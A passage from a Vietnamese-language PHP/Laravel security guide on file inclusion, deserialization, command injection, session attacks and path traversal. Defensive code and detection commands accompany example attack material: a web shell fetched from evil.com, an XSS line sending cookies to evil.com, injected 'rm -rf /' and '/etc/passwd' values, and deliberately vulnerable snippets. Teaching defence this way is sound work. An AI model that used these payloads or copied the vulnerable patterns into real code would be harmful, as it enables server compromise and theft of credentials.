include("templates/" . $template . ".php"); // Path traversal!

// Cũng nguy hiểm - basename() không đủ với null byte
$page = basename($_GET['page']);
include("pages/" . $page); // basename("../../etc/passwd\0.php") = "passwd\0.php"

// ============================================================
// SECURE
// ============================================================

// Cách 1: Whitelist - chỉ cho phép template đã định nghĩa (TỐT NHẤT)
class TemplateLoader
{
    private const ALLOWED_TEMPLATES = [
        'home'    => 'templates/home.php',
        'about'   => 'templates/about.php',
        'contact' => 'templates/contact.php',
    ];

    public function load(string $name): void
    {
        if (!array_key_exists($name, self::ALLOWED_TEMPLATES)) {
            throw new \InvalidArgumentException('Template không tồn tại: ' . $name);
        }

        $path = __DIR__ . '/' . self::ALLOWED_TEMPLATES[$name];
        require $path;
    }
}

$loader = new TemplateLoader();
$loader->load($_GET['template'] ?? 'home');

// Cách 2: Validate path nằm trong thư mục cho phép
function safeInclude(string $userInput, string $baseDir): void
{
    // Resolve path tuyệt đối
    $requestedPath = realpath($baseDir . '/' . $userInput . '.php');

    if ($requestedPath === false) {
        throw new \InvalidArgumentException('File không tồn tại');
    }

    // Đảm bảo file nằm trong baseDir (không có path traversal)
    $resolvedBase = realpath($baseDir);
    if (strpos($requestedPath, $resolvedBase) !== 0) {
        throw new \InvalidArgumentException('Truy cập không được phép');
    }

    // Chỉ cho phép file .php
    if (pathinfo($requestedPath, PATHINFO_EXTENSION) !== 'php') {
        throw new \InvalidArgumentException('Loại file không được phép');
    }

    require $requestedPath;
}

// Laravel - dùng View system (không dùng include trực tiếp)
class PageController extends Controller
{
    private const ALLOWED_PAGES = ['home', 'about', 'contact', 'faq'];

    public function show(string $page): View
    {
        if (!in_array($page, self::ALLOWED_PAGES, true)) {
            abort(404);
        }

        // Laravel view loader an toàn
        return view('pages.' . $page);
    }
}
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Không bao giờ dùng input người dùng trong `include()`/`require()`
- [ ] Dùng whitelist các template/page được phép
- [ ] Dùng `realpath()` và kiểm tra path nằm trong thư mục cho phép
- [ ] Tắt `allow_url_include` trong php.ini
- [ ] Tắt `allow_url_fopen` nếu không cần thiết
- [ ] Dùng framework template engine (Blade, Twig) thay vì include trực tiếp
- [ ] Cấu hình `open_basedir` trong php.ini để giới hạn PHP chỉ đọc file trong thư mục nhất định

**php.ini hardening:**
```ini
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/html:/tmp
```

**OWASP References:**
- CWE-98: Improper Control of Filename for Include/Require Statement
- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion

---

## 7. Remote File Inclusion (RFI) - CRITICAL

### 1. Tên
**Remote File Inclusion** (Nhúng File Từ Xa)

### 2. Phân loại
Bảo Mật Web / File Handling / Remote Code Execution

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Kẻ tấn công nhúng file PHP từ server của họ vào ứng dụng, thực thi code tùy ý dẫn đến chiếm quyền toàn bộ server (RCE).

### 4. Vấn đề
RFI tương tự LFI nhưng nguy hiểm hơn: thay vì đọc file local, kẻ tấn công trỏ đến URL của file PHP độc hại trên server của họ. PHP sẽ tải và thực thi file đó. Yêu cầu `allow_url_include = On` trong php.ini (mặc định Off từ PHP 7.4).

```
LUỒNG TẤN CÔNG RFI
===================

Kẻ tấn công (evil.com)           Ứng dụng PHP                evil.com server
     │                                 │                            │
     │  Chuẩn bị: evil.com/shell.txt   │                            │
     │  Nội dung: <?php system($_GET['c'])?>
     │                                 │                            │
     │  GET /index.php?page=           │                            │
     │  http://evil.com/shell.txt      │                            │
     │────────────────────────────────>│                            │
     │                                 │  include($_GET['page'])    │
     │                                 │  = include(http://evil.com/│
     │                                 │    shell.txt)              │
     │                                 │───────────────────────────>│
     │                                 │  Tải và THỰC THI shell.txt │
     │                                 │<───────────────────────────│
     │  GET /index.php?page=...&c=whoami
     │────────────────────────────────>│                            │
     │  www-data                       │                            │
     │<────────────────────────────────│                            │
```

### 5. Phát hiện trong mã nguồn

```bash
# Tương tự LFI nhưng cũng cần check php.ini
rg --type php "(include|require)(_once)?\s*\(\s*.*\\\$_(GET|POST|REQUEST)" -n

# Tìm file_get_contents với URL từ user
rg --type php "file_get_contents\s*\(\s*\\\$_(GET|POST|REQUEST)" -n

# Kiểm tra php.ini setting
php -r "echo ini_get('allow_url_include');"

# Tìm các hàm có thể load remote code
rg --type php "(eval|assert|preg_replace.*\/e)\s*\(" -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - RFI
// ============================================================
$page = $_GET['page']; // Kẻ tấn công: http://evil.com/shell.txt
include($page);         // Với allow_url_include=On -> RCE!

// ============================================================
// SECURE
// ============================================================

// 1. Tắt allow_url_include trong php.ini (QUAN TRỌNG NHẤT)
// allow_url_include = Off  (mặc định từ PHP 7.4)

// 2. Dùng whitelist hoàn toàn (không dùng input trong include)
class PageRouter
{
    private const ALLOWED_PAGES = ['home', 'about', 'contact'];
    private const PAGES_DIR = __DIR__ . '/pages/';

    public function load(string $pageName): void
    {
        if (!in_array($pageName, self::ALLOWED_PAGES, true)) {
            http_response_code(404);
            require self::PAGES_DIR . '404.php';
            return;
        }

        $filePath = self::PAGES_DIR . $pageName . '.php';

        if (!file_exists($filePath) || !is_file($filePath)) {
            throw new \RuntimeException("Page file missing: {$pageName}");
        }

        require $filePath;
    }
}

// Laravel dùng routing và controllers - không include theo URL
Route::get('/page/{name}', [PageController::class, 'show'])
    ->where('name', '[a-z\-]+');

class PageController extends Controller
{
    private const VALID_PAGES = ['home', 'about', 'contact'];

    public function show(string $name): View
    {
        if (!in_array($name, self::VALID_PAGES, true)) {
            abort(404);
        }
        return view('pages.' . $name);
    }
}
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Tắt `allow_url_include = Off` trong php.ini
- [ ] Tắt `allow_url_fopen = Off` nếu không cần HTTP requests trong PHP
- [ ] Không bao giờ dùng user input trong `include()`/`require()`
- [ ] Dùng whitelist cứng cho tất cả file được phép include
- [ ] Dùng framework routing thay vì "front controller tự làm"

**php.ini hardening:**
```ini
allow_url_include = Off
allow_url_fopen = Off
```

**OWASP References:**
- CWE-98: PHP Remote File Inclusion
- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion

---

## 8. Object Injection (Deserialization) - CRITICAL

### 1. Tên
**PHP Object Injection / Insecure Deserialization** (Chèn Đối Tượng PHP / Giải Tuần Tự Hóa Không An Toàn)

### 2. Phân loại
Bảo Mật Web / Input Validation / Remote Code Execution

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Kẻ tấn công tạo chuỗi serialize độc hại, khi unserialize có thể thực thi code tùy ý thông qua PHP magic methods (`__destruct`, `__wakeup`, `__toString`).

### 4. Vấn đề
PHP `unserialize()` tái tạo object từ chuỗi, khi đó PHP magic methods được gọi tự động. Nếu codebase có class với logic nguy hiểm trong `__destruct()` hoặc `__wakeup()`, kẻ tấn công có thể chuỗi các objects (POP chain) để thực thi code.

```
LUỒNG TẤN CÔNG OBJECT INJECTION
=================================

Kẻ tấn công                       PHP Application             File System
     │                                   │                          │
     │  Nghiên cứu source code:           │                          │
     │  class Logger {                    │                          │
     │    public $file;                   │                          │
     │    function __destruct() {         │                          │
     │      file_put_contents(            │                          │
     │        $this->file, "Log closed"); │                          │
     │  }}                               │                          │
     │                                   │                          │
     │  Tạo payload serialize Logger     │                          │
     │  với $file = '/var/www/shell.php' │                          │
     │  + nội dung PHP shell             │                          │
     │                                   │                          │
     │  GET /profile?data=[payload]      │                          │
     │──────────────────────────────────>│                          │
     │                                   │  unserialize($_GET['data'])
     │                                   │  -> tao Logger object    │
     │                                   │  -> __destruct() goi     │
     │                                   │──────────────────────────>│
     │                                   │                           │ Ghi shell.php
     │  GET /shell.php?c=id              │                           │
     │──────────────────────────────────────────────────────────────>│
     │  www-data                         │                           │
     │<──────────────────────────────────────────────────────────────│
```

### 5. Phát hiện trong mã nguồn

```bash
# Tìm unserialize với user input
rg --type php "unserialize\s*\(\s*\\\$_(GET|POST|REQUEST|COOKIE)" -n

# Tìm unserialize với data từ DB/cache
rg --type php "unserialize\s*\(" -n -B3

# Tìm magic methods nguy hiểm
rg --type php "__destruct|__wakeup|__toString|__invoke|__call" -n

# Tìm base64_decode rồi unserialize
rg --type php "unserialize\s*\(\s*base64_decode" -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE
// ============================================================
$data = $_COOKIE['user_prefs'];
$prefs = unserialize($data); // NGUY HIỂM - POP chain attack

// ============================================================
// SECURE
// ============================================================

// Cách 1: Dùng JSON thay vì serialize (KHUYẾN NGHỊ)
$prefs = ['theme' => 'dark', 'lang' => 'vi'];
setcookie('user_prefs', json_encode($prefs), [
    'httponly' => true,
    'secure'   => true,
    'samesite' => 'Lax',
]);

$prefs = json_decode($_COOKIE['user_prefs'] ?? '{}', true);
// json_decode không tạo object -> không trigger magic methods

// Cách 2: Nếu PHẢI dùng serialize - dùng HMAC để verify
class SecureSerializer
{
    private string $secretKey;

    public function __construct(string $secretKey)
    {
        $this->secretKey = $secretKey;
    }

    public function serialize(mixed $data): string
    {
        $serialized = base64_encode(serialize($data));
        $hmac = hash_hmac('sha256', $serialized, $this->secretKey);
        return $hmac . ':' . $serialized;
    }

    public function unserialize(string $input): mixed
    {
        $parts = explode(':', $input, 2);
        if (count($parts) !== 2) {
            throw new \InvalidArgumentException('Format không hợp lệ');
        }

        [$hmac, $serialized] = $parts;

        $expectedHmac = hash_hmac('sha256', $serialized, $this->secretKey);
        if (!hash_equals($expectedHmac, $hmac)) {
            throw new \InvalidArgumentException('Data đã bị giả mạo');
        }

        // Whitelist các class được phép (PHP 7.0+)
        return unserialize(base64_decode($serialized), [
            'allowed_classes' => [UserPreferences::class],
        ]);
    }
}

// Cách 3: allowed_classes whitelist (PHP 7.0+)
$data = unserialize($input, ['allowed_classes' => false]); // Chỉ cho scalar
$data = unserialize($input, ['allowed_classes' => [SafeClass::class]]);

// Laravel - dùng encrypted cookies (không thể giả mạo)
// Laravel tự động encrypt/decrypt cookie
// Đảm bảo APP_KEY được set và không leak

// Symfony Serializer component (an toàn hơn serialize)
use Symfony\Component\Serializer\Serializer;
use Symfony\Component\Serializer\Encoder\JsonEncoder;
use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;

$serializer = new Serializer([new ObjectNormalizer()], [new JsonEncoder()]);
$json = $serializer->serialize($object, 'json');
$object = $serializer->deserialize($json, MyClass::class, 'json');
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Không dùng `unserialize()` với dữ liệu không tin cậy
- [ ] Thay `serialize/unserialize` bằng JSON cho data đơn giản
- [ ] Dùng `allowed_classes` parameter nếu phải dùng `unserialize()`
- [ ] Verify tính toàn vẹn dữ liệu bằng HMAC trước khi deserialize
- [ ] Dùng Laravel encrypted cookies hoặc Symfony Serializer component
- [ ] Review tất cả magic methods (`__destruct`, `__wakeup`) cho logic nguy hiểm
- [ ] Cài tool gadget chain scanner: PHPGGC

**OWASP References:**
- OWASP Top 10: A08:2021 – Software and Data Integrity Failures
- CWE-502: Deserialization of Untrusted Data
- https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection

---

## 9. Command Injection - CRITICAL

### 1. Tên
**Command Injection** (Chèn Lệnh Hệ Thống)

### 2. Phân loại
Bảo Mật Web / Input Validation / Remote Code Execution

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Kẻ tấn công thực thi lệnh hệ điều hành tùy ý trên server với quyền của web server process.

### 4. Vấn đề
Command injection xảy ra khi ứng dụng truyền input người dùng vào hàm thực thi shell (`exec()`, `system()`, `shell_exec()`, `passthru()`, backtick operator) mà không escape đúng cách. Kẻ tấn công dùng ký tự đặc biệt (`; | & $() \n`) để chèn thêm lệnh.

```
LUỒNG TẤN CÔNG COMMAND INJECTION
==================================

Kẻ tấn công                         Ứng dụng PHP               OS Shell
     │                                    │                          │
     │  POST /convert                     │                          │
     │  filename=photo.jpg; rm -rf /      │                          │
     │───────────────────────────────────>│                          │
     │                                    │  $cmd = "convert " .     │
     │                                    │    $_POST['filename'] .  │
     │                                    │    " output.png";        │
     │                                    │  exec($cmd)              │
     │                                    │──────────────────────────>│
     │                                    │  Thực thi:               │
     │                                    │  convert photo.jpg;       │
     │                                    │  rm -rf /                │
     │                                    │  output.png              │
     │                                    │                          │ XOA TOAN BO FS!
     │                                    │<──────────────────────────│
```

### 5. Phát hiện trong mã nguồn

```bash
# Tìm exec/system với biến từ user
rg --type php "(exec|system|passthru|shell_exec|popen|proc_open)\s*\(" -n

# Tìm backtick operator với variables
rg --type php "`[^`]*\\\$" -n

# Tìm các hàm với user input
rg --type php "(exec|system|shell_exec)\s*\(.*\\\$_(GET|POST|REQUEST|FILES)" -n

# Tìm mail() với user-controlled parameters
rg --type php "mail\s*\(\s*\\\$_(GET|POST)" -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE
// ============================================================
$filename = $_POST['filename']; // "photo.jpg; rm -rf /"
exec("convert $filename output.png"); // NGUY HIỂM!

$domain = $_GET['domain']; // "google.com; cat /etc/passwd"
$output = shell_exec("nslookup $domain"); // NGUY HIỂM!

// ============================================================
// SECURE
// ============================================================

// Cách 1: escapeshellarg() - escape toàn bộ argument
$filename = $_POST['filename'];
$safeFilename = escapeshellarg($filename);
exec("convert $safeFilename " . escapeshellarg($outputPath), $output, $returnCode);

// Cách 2: Validate input trước với whitelist
function processImageSafe(string $filename, string $outputDir): bool
{
    if (!preg_match('/^[a-zA-Z0-9_\-\.]+\.(jpg|jpeg|png|gif|webp)$/i', $filename)) {
        throw new \InvalidArgumentException('Tên file không hợp lệ');
    }

    $uploadDir = storage_path('app/uploads/');
    $inputPath = $uploadDir . $filename;

    if (!file_exists($inputPath) || !is_file($inputPath)) {
        throw new \InvalidArgumentException('File không tồn tại');
    }

    if (realpath($inputPath) !== realpath($uploadDir) . DIRECTORY_SEPARATOR . $filename) {
        throw new \InvalidArgumentException('Truy cập không được phép');
    }

    $outputPath = $outputDir . 'thumb_' . $filename;

    exec(
        'convert ' . escapeshellarg($inputPath) . ' -resize 200x200 ' . escapeshellarg($outputPath),
        $output,
        $returnCode
    );

    return $returnCode === 0;
}

// Cách 3 (TỐT NHẤT): Dùng thư viện PHP thay vì shell command
$imagick = new \Imagick($inputPath);
$imagick->resizeImage(200, 200, \Imagick::FILTER_LANCZOS, 1);
$imagick->writeImage($outputPath);
$imagick->destroy();

// Laravel với Intervention Image
use Intervention\Image\Facades\Image;

$image = Image::make(storage_path('app/uploads/' . $filename));
$image->resize(200, 200, function ($constraint) {
    $constraint->aspectRatio();
    $constraint->upsize();
});
$image->save(storage_path('app/thumbnails/' . $filename));
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Ưu tiên dùng thư viện PHP thay vì shell commands (GD, Imagick, etc.)
- [ ] Nếu phải dùng shell: escape từng argument với `escapeshellarg()`
- [ ] Validate input: whitelist ký tự được phép
- [ ] Không truyền user input vào `exec()`, `system()`, `shell_exec()`, backtick
- [ ] Chạy web server với user có quyền tối thiểu
- [ ] Disable các hàm không dùng trong php.ini

**php.ini hardening:**
```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,parse_ini_file,show_source
```

**OWASP References:**
- OWASP Top 10: A03:2021 – Injection
- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- https://owasp.org/www-community/attacks/Command_Injection

---

## 10. Session Fixation - CRITICAL

### 1. Tên
**Session Fixation** (Cố Định Phiên Làm Việc)

### 2. Phân loại
Bảo Mật Web / Authentication & Session / Session Management

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Kẻ tấn công biết trước session ID và chờ nạn nhân đăng nhập vào đó, sau đó dùng session đó để truy cập như người dùng đã xác thực.

### 4. Vấn đề
Session Fixation xảy ra khi ứng dụng không tạo session ID mới sau khi đăng nhập thành công. Kẻ tấn công có thể thiết lập session ID trước (qua URL parameter hoặc cookie), sau đó dụ nạn nhân đăng nhập với session đó.

```
LUỒNG TẤN CÔNG SESSION FIXATION
==================================

Kẻ tấn công                         Nạn nhân                  Ứng dụng PHP
     │                                   │                           │
     │  GET /login (lấy session ID)       │                           │
     │──────────────────────────────────────────────────────────────>│
     │  Nhận: PHPSESSID=abc123           │                           │
     │<──────────────────────────────────────────────────────────────│
     │                                   │                           │
     │  Gửi link: https://app.com/login?PHPSESSID=abc123
     │──────────────────────────────────>│                           │
     │                                   │  Dăng nhập với link trên  │
     │                                   │──────────────────────────>│
     │                                   │                           │ Không regenerate!
     │                                   │  Đăng nhập thành công     │
     │                                   │<──────────────────────────│
     │                                   │  Session abc123 = auth    │
     │                                   │                           │
     │  Dùng PHPSESSID=abc123 (đã biết) │                           │
     │──────────────────────────────────────────────────────────────>│
     │  Truy cập như nạn nhân đã auth!   │                           │
     │<──────────────────────────────────────────────────────────────│
```

### 5. Phát hiện trong mã nguồn

```bash
# Tìm xử lý login không có session_regenerate_id
rg --type php "session_start" -n -A20

# Tìm login logic thiếu regenerate
rg --type php "(login|authenticate|signin)" -i -n -A15

# Tìm chấp nhận session ID từ GET parameter
rg --type php "session_id\s*\(\s*\\\$_(GET|POST|REQUEST)" -n

# Tìm php.ini setting nguy hiểm
rg "session\.use_only_cookies\s*=\s*0" -n
rg "session\.use_trans_sid\s*=\s*1" -n

# Tìm session_regenerate_id thiếu true parameter
rg --type php "session_regenerate_id\s*\(\s*\)" -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - Session Fixation
// ============================================================
session_start();

function login(string $username, string $password): bool
{
    if (verifyCredentials($username, $password)) {
        $_SESSION['user'] = $username;
        $_SESSION['authenticated'] = true;
        // KHÔNG gọi session_regenerate_id() -> Session Fixation!
        return true;
    }
    return false;
}

// ============================================================
// SECURE
// ============================================================

function loginSecure(string $username, string $password): bool
{
    session_start();

    if (!verifyCredentials($username, $password)) {
        return false;
    }

    // QUAN TRỌNG: Regenerate session ID sau khi xác thực thành công
    // true = xóa session file cũ (chống session fixation)
    session_regenerate_id(true);

    $_SESSION['user_id'] = getUserId($username);
    $_SESSION['authenticated'] = true;
    $_SESSION['login_time'] = time();
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];

    return true;
}

// Cấu hình session an toàn
ini_set('session.use_only_cookies', '1');
ini_set('session.use_trans_sid', '0');
ini_set('session.cookie_httponly', '1');
ini_set('session.cookie_secure', '1');
ini_set('session.cookie_samesite', 'Lax');
ini_set('session.gc_maxlifetime', '3600');

// Logout - destroy session hoàn toàn
function logout(): void
{
    session_start();
    $_SESSION = [];

    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(
            session_name(), '',
            time() - 42000,
            $params['path'], $params['domain'],
            $params['secure'], $params['httponly']
        );
    }

    session_destroy();
}

// ============================================================
// LARAVEL - Session regeneration tự động
// ============================================================
class LoginController extends Controller
{
    public function login(Request $request): RedirectResponse
    {
        $credentials = $request->validate([
            'email'    => ['required', 'email'],
            'password' => ['required'],
        ]);

        if (Auth::attempt($credentials, $request->boolean('remember'))) {
            // Laravel tự động regenerate session sau attempt thành công
            $request->session()->regenerate();
            return redirect()->intended('/dashboard');
        }

        return back()->withErrors([
            'email' => 'Email hoặc mật khẩu không đúng',
        ]);
    }

    public function logout(Request $request): RedirectResponse
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect('/');
    }
}
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Gọi `session_regenerate_id(true)` ngay sau khi xác thực thành công
- [ ] Cấu hình `session.use_only_cookies = 1`
- [ ] Tắt `session.use_trans_sid = 0`
- [ ] Bật `HttpOnly` và `Secure` flag cho session cookie
- [ ] Set `SameSite=Lax` hoặc `Strict` cho session cookie
- [ ] Implement session timeout
- [ ] Validate User-Agent và IP trong session

**OWASP References:**
- OWASP Top 10: A07:2021 – Identification and Authentication Failures
- CWE-384: Session Fixation
- https://owasp.org/www-community/attacks/Session_fixation

---

## 11. Session Hijacking - HIGH

### 1. Tên
**Session Hijacking** (Đánh Cắp Phiên Làm Việc)

### 2. Phân loại
Bảo Mật Web / Authentication & Session / Session Management

### 3. Mức nghiêm trọng
🟠 **HIGH** - Kẻ tấn công đánh cắp session ID hợp lệ của người dùng đã đăng nhập và giả mạo danh tính của họ.

### 4. Vấn đề
Session Hijacking là việc đánh cắp session ID sau khi nạn nhân đã đăng nhập. Các phương thức: XSS để đọc cookie, network sniffing (HTTP không có HTTPS), predictable session IDs, session ID trong URL logs.

```
CÁC PHƯƠNG THỨC HIJACKING
===========================

1. XSS -> Đọc Cookie:
   Payload: <script>fetch('evil.com?c='+document.cookie)</script>
   Browser nạn nhân chạy script -> gửi PHPSESSID đến kẻ tấn công

2. Network Sniffing (HTTP không mã hóa):
   Nạn nhân --[HTTP]-- App
   Kẻ tấn công (same network) sniff gói tin -> capture PHPSESSID

3. Session ID trong URL:
   /dashboard?PHPSESSID=abc123
   -> Lưu trong server logs, Referer header, browser history
   -> Kẻ tấn công đọc log hoặc Referer header

4. Predictable Session ID:
   Session ID yếu (md5 của timestamp) -> brute force
```

### 5. Phát hiện trong mã nguồn

```bash
# Tìm session ID trong URL
rg "use_trans_sid" -n
rg "PHPSESSID" -n

# Tìm cookie không có HttpOnly/Secure flag
rg --type php "setcookie\s*\(" -n -A5

# Tìm session không validate binding data
rg --type php "session_start" -n -A30

# Kiểm tra force HTTPS
rg --type php "session\.cookie_secure\s*=\s*(0|false)" -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// SECURE - Session binding và validation
// ============================================================

class SecureSession
{
    private const SESSION_TIMEOUT = 3600;   // 1 giờ
    private const IDLE_TIMEOUT   = 1800;    // 30 phút idle

    public static function start(): void
    {
        ini_set('session.use_only_cookies', '1');
        ini_set('session.use_trans_sid', '0');
        ini_set('session.cookie_httponly', '1');
        ini_set('session.cookie_secure', '1');
        ini_set('session.cookie_samesite', 'Lax');
        ini_set('session.gc_maxlifetime', (string)self::SESSION_TIMEOUT);

        session_start();
        self::validate();
    }

    private static function validate(): void
    {
        if (!isset($_SESSION['_created'])) {
            self::initialize();
            return;
        }

        // Kiểm tra session timeout tuyệt đối
        if (time() - $_SESSION['_created'] > self::SESSION_TIMEOUT) {
            self::destroy();
            throw new \RuntimeException('Phiên đã hết hạn');
        }

        // Kiểm tra idle timeout
        if (time() - $_SESSION['_last_activity'] > self::IDLE_TIMEOUT) {
            self::destroy();
            throw new \RuntimeException('Phiên không hoạt động - đã hết hạn');
        }

        // Validate User-Agent binding
        $currentUA = md5($_SERVER['HTTP_USER_AGENT'] ?? '');
        if ($_SESSION['_user_agent'] !== $currentUA) {
            self::destroy();
            throw new \RuntimeException('Session binding không hợp lệ');
        }

        $_SESSION['_last_activity'] = time();

        // Regenerate session ID định kỳ (mỗi 15 phút)
        if (time() - $_SESSION['_regenerated'] > 900) {
            session_regenerate_id(true);
            $_SESSION['_regenerated'] = time();
        }
    }

    private static function initialize(): void
    {
        $_SESSION['_created']       = time();
        $_SESSION['_last_activity'] = time();
        $_SESSION['_regenerated']   = time();
        $_SESSION['_user_agent']    = md5($_SERVER['HTTP_USER_AGENT'] ?? '');
        $_SESSION['_ip_prefix']     = implode('.', array_slice(explode('.', $_SERVER['REMOTE_ADDR']), 0, 3));
    }

    public static function destroy(): void
    {
        $_SESSION = [];
        if (ini_get('session.use_cookies')) {
            $params = session_get_cookie_params();
            setcookie(session_name(), '', time() - 42000,
                $params['path'], $params['domain'],
                $params['secure'], $params['httponly']
            );
        }
        session_destroy();
    }
}

// Laravel - config/session.php
// 'driver'    => 'database',  // Không dùng 'file' trong production
// 'lifetime'  => 120,
// 'encrypt'   => true,        // Encrypt session data
// 'secure'    => env('SESSION_SECURE_COOKIE', true),
// 'http_only' => true,
// 'same_site' => 'lax',
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Bắt buộc HTTPS cho toàn bộ ứng dụng
- [ ] Set `Secure`, `HttpOnly`, `SameSite` flags cho session cookie
- [ ] Implement session timeout (absolute + idle)
- [ ] Regenerate session ID định kỳ
- [ ] Validate User-Agent binding trong session
- [ ] Encrypt session data (Laravel `'encrypt' => true`)
- [ ] Dùng database driver thay vì file driver cho session

**OWASP References:**
- CWE-613: Insufficient Session Expiration
- CWE-523: Unprotected Transport of Credentials
- https://owasp.org/www-community/attacks/Session_hijacking_attack

---

## 12. Directory Traversal - CRITICAL

### 1. Tên
**Directory Traversal / Path Traversal** (Duyệt Thư Mục Ngoài Phạm Vi)

### 2. Phân loại
Bảo Mật Web / File Handling / Information Disclosure

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Kẻ tấn công đọc file ngoài thư mục web root: `.env`, `config/database.php`, private keys, `/etc/passwd`, source code tùy ý.

### 4. Vấn đề
Directory Traversal xảy ra khi ứng dụng dùng input người dùng để xây dựng đường dẫn file mà không kiểm tra path có nằm trong thư mục cho phép. Kẻ tấn công dùng `../` (hoặc encode: `%2e%2e%2f`, `..%2f`) để leo lên thư mục cha.

```
LUỒNG TẤN CÔNG DIRECTORY TRAVERSAL
=====================================

Kẻ tấn công                         Ứng dụng PHP              File System
     │                                    │                          │
     │  GET /download?file=report.pdf     │                          │
     │──────────────────────────────────>│                          │
     │  Nhận report.pdf (hợp lệ)          │                          │
     │<──────────────────────────────────│                          │
     │                                    │                          │
     │  GET /download?file=../../../../.env
     │──────────────────────────────────>│                          │
     │                                    │  $path = $baseDir .      │
     │                                    │    $_GET['file']         │
     │                                    │  = /var/www/uploads/     │
     │                                    │    ../../../../.env       │
     │                                    │  = /var/www/.env         │
     │                                    │──────────────────────────>│
     │  APP_KEY=base64:xxx...            │                           │ Đọc .env!
     │  DB_PASSWORD=secret123           │                           │
     │<──────────────────────────────────│                           │
     │                                    │                           │
     │  URL-encode bypass: %2e%2e%2f%2e%2e%2f.env
     │  Double encode: %252e%252e%252f   │                           │
```

### 5. Phát hiện trong mã nguồn

```bash
# Tìm file_get_contents với path từ user
rg --type php "file_get_contents\s*\(\s*.*\\\$_(GET|POST|REQUEST)" -n

# Tìm readfile với user input
rg --type php "readfile\s*\(\s*.*\\\$_(GET|POST|REQUEST)" -n

# Tìm fopen với user-controlled path
rg --type php "fopen\s*\(\s*.*\\\$_(GET|POST|REQUEST|COOKIE)" -n

# Tìm response file/download với filename từ request
rg --type php "(->file\(|->download\()\s*.*\\\$_(GET|POST)" -n

# Tìm str_replace hoặc basename không đủ bảo vệ
rg --type php "str_replace\s*\(\s*['\"]\.\.\/['\"]" -n -A3
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - Directory Traversal
// ============================================================
$filename = $_GET['file']; // "../../../../.env"
$path = "/var/www/html/uploads/" . $filename;
echo file_get_contents($path); // Đọc .env!

// Vẫn nguy hiểm - str_replace không đủ
$filename = str_replace('../', '', $_GET['file']); // Bypass: "....//....//etc/passwd"

// basename() không đủ - chỉ lấy tên file, bypass với symlink
$filename = basename($_GET['file']);
readfile("/uploads/" . $filename);

// ============================================================
// SECURE
// ============================================================

class SecureFileServer
{
    private string $baseDirectory;

    public function __construct(string $baseDirectory)
    {
        $this->baseDirectory = realpath($baseDirectory);
        if ($this->baseDirectory === false) {
            throw new \InvalidArgumentException('Thư mục không tồn tại');
        }
    }

    public function download(string $filename): void
    {
        // 1. Loại bỏ ký tự nguy hiểm
        $filename = basename($filename);

        // 2. Validate format tên file (whitelist characters)
        if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $filename)) {
            http_response_code(400);
            throw new \InvalidArgumentException('Tên file không hợp lệ');
        }

        // 3. Build path và resolve
        $requestedPath = $this->baseDirectory . DIRECTORY_SEPARATOR . $filename;
        $resolvedPath  = realpath($requestedPath);

        // 4. Kiểm tra file tồn tại
        if ($resolvedPath === false) {
            http_response_code(404);
            throw new \RuntimeException('File không tồn tại');
        }

        // 5. QUAN TRỌNG: Kiểm tra path nằm trong baseDirectory
        if (strpos($resolvedPath, $this->baseDirectory . DIRECTORY_SEPARATOR) !== 0
            && $resolvedPath !== $this->baseDirectory) {
            http_response_code(403);
            throw new \RuntimeException('Truy cập bị từ chối');
        }

        // 6. Kiểm tra là file (không phải thư mục)
        if (!is_file($resolvedPath)) {
            http_response_code(404);
            throw new \RuntimeException('Không phải file');
        }

        // 7. Phục vụ file
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . htmlspecialchars($filename, ENT_QUOTES) . '"');
        header('Content-Length: ' . filesize($resolvedPath));
        readfile($resolvedPath);
        exit;
    }
}

// Laravel - dùng Storage facade (an toàn)
use Illuminate\Support\Facades\Storage;

class DownloadController extends Controller
{
    public function download(Request $request): Response
    {
        $filename = $request->input('file');

        // Validate filename
        if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $filename)) {
            abort(400, 'Tên file không hợp lệ');
        }

        // Storage::disk('private') - lưu ngoài public root
        if (!Storage::disk('private')->exists('downloads/' . $filename)) {
            abort(404);
        }

        // Kiểm tra user có quyền download không
        $this->authorize('download', $filename);

        return Storage::disk('private')->download('downloads/' . $filename);
    }
}
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Luôn dùng `realpath()` và kiểm tra path nằm trong thư mục cho phép
- [ ] Validate filename: chỉ cho phép ký tự `[a-zA-Z0-9_\-\.]`
- [ ] Không dùng input người dùng trực tiếp trong đường dẫn file
- [ ] Dùng UUID làm tên file khi lưu, lưu mapping trong database
- [ ] Dùng Laravel `Storage` facade hoặc Symfony Filesystem component
- [ ] Phục vụ file qua controller (không expose đường dẫn thực)
